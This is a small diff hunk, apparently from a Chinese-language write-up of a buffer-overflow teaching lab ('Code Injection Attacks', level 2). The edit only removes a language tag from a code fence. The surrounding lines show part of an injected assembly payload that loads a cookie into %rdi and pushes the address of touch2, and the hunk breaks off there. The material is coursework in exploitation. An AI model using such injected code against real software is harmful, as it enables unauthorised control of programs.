@@ -174,7 +174,7 @@ Dump of assembler code for function touch2:
 
 新建一个文件`phase2.s`：
 
-```s
+```
 # to solve the level 2 of Code Injection Attacks
 mov $0x59b997fa, %rdi # set cookie in %rdi
 push $0x4017ec
